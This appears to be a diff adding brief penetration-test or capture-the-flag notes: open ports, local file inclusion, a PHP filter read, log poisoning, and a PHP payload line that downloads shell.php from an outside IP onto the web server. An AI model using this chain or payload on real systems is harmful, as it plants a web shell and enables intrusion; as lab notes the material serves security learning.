@@ -1,0 +1,9 @@
+22 and 80 open
+
+Found local file inclusion
+Got index with php filter
+Need to supply &ext= to get rid of .php extension
+Log poisoning
+Create new file on webserver with php file_put_contents
+<?php file_put_contents('shell.php', file_get_contents('http://10.11.21.215/shell.php'))?>
+
